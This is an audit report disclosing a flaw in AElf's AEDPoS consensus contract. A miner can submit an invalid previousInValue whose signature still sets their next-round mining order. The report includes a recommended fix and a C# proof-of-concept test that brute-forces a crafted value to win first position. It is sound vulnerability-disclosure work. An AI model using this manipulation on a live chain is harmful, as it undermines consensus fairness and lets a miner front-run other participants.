# Audit Report

## Title
Miners Can Manipulate Next Round Mining Order Through Invalid PreviousInValue

## Summary
Miners can manipulate their mining position in the next consensus round by providing arbitrary `previousInValue` that fails validation. The validation correctly rejects the invalid value by setting it to `Hash.Empty`, but the signature calculation still uses the attacker-controlled input, allowing miners to trivially find favorable mining positions through simple random sampling.

## Finding Description

The vulnerability exists in the consensus extra data generation flow where signature calculation uses miner-provided `previousInValue` even when validation fails. [1](#0-0) 

When validation detects that the hash of `triggerInformation.PreviousInValue` does not match the previous round's `OutValue`, the local variable `previousInValue` is set to `Hash.Empty`. However, the signature is still calculated using `previousRound.CalculateSignature(triggerInformation.PreviousInValue)` - the original attacker-controlled value.

This signature directly determines the miner's next round position: [2](#0-1) 

The signature's integer value modulo the miner count determines `supposedOrderOfNextRound`, which becomes the miner's `FinalOrderOfNextRound`.

The validation explicitly allows `Hash.Empty` for `previousInValue`: [3](#0-2) 

When the next round is generated, miners are ordered by their `FinalOrderOfNextRound`: [4](#0-3) 

The signature calculation mechanism is: [5](#0-4) 

The attack is trivial:
1. Read `previousRound` state from blockchain (public data)
2. Try random Hash values `X` as `PreviousInValue`
3. For each `X`, calculate `signature = CalculateSignature(X)` and check if `signature.ToInt64() % minersCount + 1 == desiredOrder`
4. Expected attempts: ~minersCount (typically 17-101), which takes milliseconds
5. Submit the found `X` value - validation will fail and set `previousInValue = Hash.Empty`, but the signature based on `X` determines the mining order

## Impact Explanation

**High Severity - Consensus Integrity Compromise**: This vulnerability breaks the fundamental security property that miners cannot choose their mining schedule position. The AEDPoS consensus relies on unpredictable mining order to ensure fairness.

Impact includes:
1. **Front-running Advantages**: Miners can position themselves first to capture high-fee transactions
2. **Strategic Timing Control**: Miners can select time slots aligned with external events or coordinate with protocol actions
3. **Unfair Resource Distribution**: Mining order affects block production rewards and network influence
4. **Systemic Effect**: Multiple miners exploiting this simultaneously distorts the entire mining schedule fairness

## Likelihood Explanation

**High Likelihood**: 
1. **Public Entry Point**: `GetConsensusExtraData` is a public ACS4 method called during block production [6](#0-5) 
2. **Trivial Computation**: Finding the required value takes only ~minersCount attempts (17-101 random tries)
3. **Undetectable**: Appears as a legitimate scenario where a miner didn't have their previous round InValue
4. **Strong Incentive**: Better mining positions provide direct economic advantages
5. **No Validation**: No check verifies that the signature correctly derives from the stored `previousInValue`

## Recommendation

Add validation to ensure the signature matches the stored `previousInValue`. In `UpdateValueValidationProvider.ValidatePreviousInValue`:

```csharp
private bool ValidatePreviousInValue(ConsensusValidationContext validationContext)
{
    var extraData = validationContext.ExtraData;
    var publicKey = validationContext.SenderPubkey;
    
    if (!validationContext.PreviousRound.RealTimeMinersInformation.ContainsKey(publicKey)) 
        return true;
    
    var minerInRound = extraData.Round.RealTimeMinersInformation[publicKey];
    var previousInValue = minerInRound.PreviousInValue;
    
    if (previousInValue == null) return true;
    
    var previousOutValue = validationContext.PreviousRound.RealTimeMinersInformation[publicKey].OutValue;
    
    // If previousInValue is Hash.Empty, signature must also be calculated with Hash.Empty
    if (previousInValue == Hash.Empty)
    {
        var expectedSignature = validationContext.PreviousRound.CalculateSignature(Hash.Empty);
        return minerInRound.Signature == expectedSignature;
    }
    
    // Otherwise, validate that previousInValue hashes to previousOutValue
    if (HashHelper.ComputeFrom(previousInValue) != previousOutValue)
        return false;
    
    // And validate that signature was calculated with this previousInValue
    var calculatedSignature = validationContext.PreviousRound.CalculateSignature(previousInValue);
    return minerInRound.Signature == calculatedSignature;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task MinerCanManipulateNextRoundOrder_Test()
{
    // Initialize consensus with multiple miners
    await InitializeCandidates(5);
    var firstRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    
    // Have all miners produce blocks in round 1 to establish previousRound state
    foreach (var minerInRound in firstRound.RealTimeMinersInformation.Values.OrderBy(m => m.Order))
    {
        var keyPair = InitialCoreDataCenterKeyPairs.First(p => p.PublicKey.ToHex() == minerInRound.Pubkey);
        BlockTimeProvider.SetBlockTime(minerInRound.ExpectedMiningTime);
        var tester = GetAEDPoSContractStub(keyPair);
        
        var inValue = HashHelper.ComputeFrom($"honest-{minerInRound.Pubkey}");
        var trigger = new AElfConsensusTriggerInformation
        {
            Pubkey = ByteString.CopyFrom(keyPair.PublicKey),
            InValue = inValue,
            Behaviour = AElfConsensusBehaviour.UpdateValue
        };
        
        var headerInfo = (await tester.GetConsensusExtraData.CallAsync(trigger.ToBytesValue()))
            .ToConsensusHeaderInformation();
        await tester.UpdateValue.SendAsync(
            headerInfo.Round.ExtractInformationToUpdateConsensus(minerInRound.Pubkey, ByteString.Empty));
    }
    
    // Advance to round 2
    var previousRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var lastMinerTime = previousRound.RealTimeMinersInformation.Values.Max(m => m.ExpectedMiningTime);
    BlockTimeProvider.SetBlockTime(lastMinerTime.AddMilliseconds(4000));
    
    // Attacker wants to be first in next round (order 1)
    var attackerKeyPair = InitialCoreDataCenterKeyPairs[0];
    var attacker = GetAEDPoSContractStub(attackerKeyPair);
    var desiredOrder = 1;
    var minersCount = previousRound.RealTimeMinersInformation.Count;
    
    // Brute-force to find a PreviousInValue that gives desired order
    Hash craftedPreviousInValue = null;
    for (int i = 0; i < 1000; i++)  // Should succeed within ~minersCount attempts
    {
        var testValue = HashHelper.ComputeFrom($"craft-{i}");
        var testSignature = previousRound.CalculateSignature(testValue);
        var resultingOrder = Math.Abs(testSignature.ToInt64() % minersCount) + 1;
        
        if (resultingOrder == desiredOrder)
        {
            craftedPreviousInValue = testValue;
            break;
        }
    }
    
    craftedPreviousInValue.ShouldNotBeNull();
    
    // Submit crafted value
    var newInValue = HashHelper.ComputeFrom("new-value");
    var attackTrigger = new AElfConsensusTriggerInformation
    {
        Pubkey = ByteString.CopyFrom(attackerKeyPair.PublicKey),
        InValue = newInValue,
        PreviousInValue = craftedPreviousInValue,  // Crafted value that will fail validation
        Behaviour = AElfConsensusBehaviour.UpdateValue
    };
    
    var attackHeaderInfo = (await attacker.GetConsensusExtraData.CallAsync(attackTrigger.ToBytesValue()))
        .ToConsensusHeaderInformation();
    
    // Validation should pass (previousInValue will be Hash.Empty)
    await attacker.UpdateValue.SendAsync(
        attackHeaderInfo.Round.ExtractInformationToUpdateConsensus(
            attackerKeyPair.PublicKey.ToHex(), ByteString.Empty));
    
    // Verify attacker achieved desired order in next round
    var currentRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var attackerInfo = currentRound.RealTimeMinersInformation[attackerKeyPair.PublicKey.ToHex()];
    attackerInfo.FinalOrderOfNextRound.ShouldBe(desiredOrder);
}
```

## Notes

This vulnerability is entirely within the smart contract logic and does not rely on any off-chain component manipulation. While the claim references off-chain trigger information providers, the core issue is that the contract itself uses attacker-controlled input for signature calculation even after validation rejects it. The attack requires only being an active miner and performing simple random sampling to find a suitable value.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_GetConsensusBlockExtraData.cs (L80-92)
```csharp
                if (previousRound.RealTimeMinersInformation.ContainsKey(pubkey) &&
                    HashHelper.ComputeFrom(triggerInformation.PreviousInValue) !=
                    previousRound.RealTimeMinersInformation[pubkey].OutValue)
                {
                    Context.LogDebug(() => "Failed to produce block at previous round?");
                    previousInValue = Hash.Empty;
                }
                else
                {
                    previousInValue = triggerInformation.PreviousInValue;
                }

                signature = previousRound.CalculateSignature(triggerInformation.PreviousInValue);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_ApplyNormalConsensusData.cs (L8-47)
```csharp
    public Round ApplyNormalConsensusData(string pubkey, Hash previousInValue, Hash outValue, Hash signature)
    {
        if (!RealTimeMinersInformation.ContainsKey(pubkey)) return this;

        RealTimeMinersInformation[pubkey].OutValue = outValue;
        RealTimeMinersInformation[pubkey].Signature = signature;
        if (RealTimeMinersInformation[pubkey].PreviousInValue == Hash.Empty ||
            RealTimeMinersInformation[pubkey].PreviousInValue == null)
            RealTimeMinersInformation[pubkey].PreviousInValue = previousInValue;

        var minersCount = RealTimeMinersInformation.Count;
        var sigNum = signature.ToInt64();

        var supposedOrderOfNextRound = GetAbsModulus(sigNum, minersCount) + 1;

        // Check the existence of conflicts about OrderOfNextRound.
        // If so, modify others'.
        var conflicts = RealTimeMinersInformation.Values
            .Where(i => i.FinalOrderOfNextRound == supposedOrderOfNextRound).ToList();

        foreach (var orderConflictedMiner in conflicts)
            // Multiple conflicts is unlikely.

            for (var i = supposedOrderOfNextRound + 1; i < minersCount * 2; i++)
            {
                var maybeNewOrder = i > minersCount ? i % minersCount : i;
                if (RealTimeMinersInformation.Values.All(m => m.FinalOrderOfNextRound != maybeNewOrder))
                {
                    RealTimeMinersInformation[orderConflictedMiner.Pubkey].FinalOrderOfNextRound =
                        maybeNewOrder;
                    break;
                }
            }

        RealTimeMinersInformation[pubkey].SupposedOrderOfNextRound = supposedOrderOfNextRound;
        // Initialize FinalOrderOfNextRound as the value of SupposedOrderOfNextRound
        RealTimeMinersInformation[pubkey].FinalOrderOfNextRound = supposedOrderOfNextRound;

        return this;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L35-49)
```csharp
    private bool ValidatePreviousInValue(ConsensusValidationContext validationContext)
    {
        var extraData = validationContext.ExtraData;
        var publicKey = validationContext.SenderPubkey;

        if (!validationContext.PreviousRound.RealTimeMinersInformation.ContainsKey(publicKey)) return true;

        if (extraData.Round.RealTimeMinersInformation[publicKey].PreviousInValue == null) return true;

        var previousOutValue = validationContext.PreviousRound.RealTimeMinersInformation[publicKey].OutValue;
        var previousInValue = extraData.Round.RealTimeMinersInformation[publicKey].PreviousInValue;
        if (previousInValue == Hash.Empty) return true;

        return HashHelper.ComputeFrom(previousInValue) == previousOutValue;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Generation.cs (L25-36)
```csharp
        // Set next round miners' information of miners who successfully mined during this round.
        foreach (var minerInRound in minersMinedCurrentRound.OrderBy(m => m.FinalOrderOfNextRound))
        {
            var order = minerInRound.FinalOrderOfNextRound;
            nextRound.RealTimeMinersInformation[minerInRound.Pubkey] = new MinerInRound
            {
                Pubkey = minerInRound.Pubkey,
                Order = order,
                ExpectedMiningTime = currentBlockTimestamp.AddMilliseconds(miningInterval.Mul(order)),
                ProducedBlocks = minerInRound.ProducedBlocks,
                MissedTimeSlots = minerInRound.MissedTimeSlots
            };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L110-115)
```csharp
    public Hash CalculateSignature(Hash inValue)
    {
        return HashHelper.XorAndCompute(inValue,
            RealTimeMinersInformation.Values.Aggregate(Hash.Empty,
                (current, minerInRound) => HashHelper.XorAndCompute(current, minerInRound.Signature)));
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ACS4_ConsensusInformationProvider.cs (L56-59)
```csharp
    public override BytesValue GetConsensusExtraData(BytesValue input)
    {
        return GetConsensusBlockExtraData(input);
    }
```
